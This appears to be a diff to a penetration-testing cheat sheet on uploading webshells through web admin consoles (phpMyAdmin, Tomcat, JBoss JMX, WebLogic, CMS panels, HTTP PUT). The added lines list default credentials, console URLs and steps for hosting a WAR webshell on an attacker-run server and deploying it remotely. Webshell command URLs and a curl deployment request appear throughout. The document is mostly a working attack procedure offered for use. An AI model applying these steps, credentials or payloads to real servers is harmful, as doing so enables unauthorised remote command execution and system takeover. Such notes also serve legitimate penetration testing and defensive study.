@@ -19,12 +19,13 @@
 9. Webshell upload using a Jenkins admin console
 10. ...
 ```
-##### Example 1 - PHPMyAdmin Web console
+##### Technique 1 - PHPMyAdmin Web console
 ```
 ➤ Step 1. Log into the PHPMyAdmin Web console by exploiting the presence of default or easy guessable credentials,
 	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
           - URL: http://x.x.x.x/phpmyadmin or http://x.x.x.x/website-name/phpmyadmin)
-
+          - Default or weak credentials: root:root, root and empty password
+	  
 ➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
           - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
           - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
@@ -43,19 +44,23 @@
           - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami
 ```
 
-##### Example 2 - Apache Tomcat Manager Web console
+##### Technique 2 - Apache Tomcat Manager Web console
 ```
 ➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
 	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
 	  - URL: http://x.x.x.x/:8080/manager/html or http://x.x.x.x/website-name/manager, ...)
-  
+	  - Default or weak credentials: tomcat:tomcat, tomcat:manager, manager:manager, admin:manager, xampp:xampp, ...
+	  
 ➤ Step 2. Upload and deploy your WAR file 
           (i.e. "Select WAR file to upload" and then click on the "Deploy" button)
 
 ➤ Step 3. Then go to the application section to see the details about your new deployed application (e.g. path, start/stop/reload/undeploy buttons etc.)
 
 ➤ Step 4. Execute OS command using the Webshell 
-          - Example: http://target_IP:port/<path>/webshell.jsp?cmd=whoami
+          - Examples: 
+	    + http://target_IP:port/<path>/webshell.jsp?cmd=whoami
+	    + http://target_IP:port/webshell/webshell.jsp?cmd=whoami
+
 ```
 
 <i>Example - How to create a WAR file</i>
@@ -94,22 +99,45 @@
 	</BODY>
 	</HTML>
 
-2. Generate a WAR file with the web shell : "jar -cvf cmd.war webshell.jsp"
+2. Generate a WAR file with the web shell : "jar -cvf webshell.war webshell.jsp"
 3. Upload the WAR file to a Web server such as Tomcat, Websphere, Weblogic, JBoss etc.
 ```
 
 
-##### Example 3 - JBoss Administration JMX console
-Notes:
-- JBOSS default installation is not secure at all, there are few administrative interfaces that can be accessed without any authentication 
-  or withe the default credentials admin:admin:
-  > jmx-console,
-  > admin-console 
-- The User password hashs are stored in file "mgmt-users.properties"
-
+##### Technique 3 - JBoss Administration JMX console
 ```
-Simple manual exploitation example
------------------------------------
+➤ Step 1. Log into the JBoss JMX console by exploiting the presence of default or easy guessable credentials,
+	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
+	  - Default or weak credentials: admin:admin, sysadmin:sysadmin, ...
+	  - Examples of URL:
+	    + https://x.x.x.x:9990/console
+	    + https://x.x.x.x:8090/jmx-console/
+	    + https://x.x.x.x:8080/jmx-console/
+	    + https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
+	    + https://x.x.x.x:8080/web-console/ServerInfo.jsp
+	    + https://x.x.x.x:8080/invoker/JMXInvokerServlet
+	    + https://x.x.x.x:8080/admin-console/
+	    
+➤ Step 2. Create a WAR file (e.g., webshell.war) with a jsp webshell and host it in a publicly available web server (python -m SimpleHTTPServer 80)
+	  
+➤ Step 3. On to the JMX Console, browse the URL below and type in the ObjectName filter field "*:service=MainDeployer" 
+          then click on “service=MainDeployer”
+	  - https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=displayMBeans
+
+➤ Step 4. Use the “void deploy()” function to deploy a WAR file
+	  - Enter the IP address of the Web server and the name of your WAR file in the URL box (in the "ParamValue" field) 
+	    + example: x.x.x.x/webshell.war 
+	  - Then click the “Invoke” button
+	  - The web server should display the message "Operation completed successfully with a return value" 
+
+➤ Step 5.  Execute OS commands using the Webshell 
+          - Examples: 
+	    + http://x.x.x.x:8080/webshell/webshell.jsp?cmd=whoami&html=true
+	    + http://x.x.x.x:9090/webshell/webshell.jsp?cmd=whoami
+
+
+Other exploitation examples
+---------------------------
 ➤ Step 1. On the command line, type the following cURL request (wrapped for better readability) to deploy a WAR file using the JMX Console:
           $ curl ’http://x.x.x.x:8080/jmx-console/HtmlAdaptor
           ?action=invokeOpByName
@@ -135,12 +163,12 @@ Simple manual exploitation example
 Other manual Webshell upload technique: https://securitysynapse.blogspot.com/2013/08/manually-exploiting-jboss-jmx-console.html
 ```
 
-##### Example 4 - Weblogic Administration console
+##### Technique 4 - Weblogic Administration console
 ```
 ➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
 	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
           - URL should be something like: "http:\\<Admin_server_IP>:<AdminServerPort>/console" or "https:\\x.x.x.x:7001/console", ...
-          - Common default or weak credentials: weblogic:weblogic, weblogic/weblogic1, weblogic/welcome1, system/Passw0rd (for Weblogic Server 11g), system/password, system/weblogic, ...
+          - Default or weak credentials: weblogic:weblogic, weblogic/weblogic1, weblogic/welcome1, system/Passw0rd (for Weblogic Server 11g), system/password, system/weblogic, ...
   
 ➤ Step 2. From the tree-structure in the left panel, choose the Web Applications node under the Deployments node. 
           Then, click on the Configure a new Web Application link in the left pane to begin the deployment of yout 'Webshell.war' application.
@@ -167,7 +195,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
           - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
 ```
 
-##### Example 5 - Webshell upload by abusing a CMS Website admin console protected by a weak administrator password
+##### Technique 5 - Webshell upload by abusing a CMS Website admin console protected by a weak administrator password
 If you have admin privileges over a CMS such as WordPress, Kentico, DotNetNuke, Drupal, Joomla [...] then you can upload a webshell and execute OS command. 
 ``` 
 Example 1 - WorPress
@@ -197,7 +225,7 @@ Example 2 - Kentico
 ➤ Step 3. upload a '.aspx' or '.asp' webshell using the CMS native upoad file function
 ``` 
 
-##### Example 6 - Webshell upload by abusing the insecure HTTP PUT method
+##### Technique 6 - Webshell upload by abusing the insecure HTTP PUT method
 ```
 ➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
 ➤ Step 2. Identify the DocumentRoot directory (Web root folder)
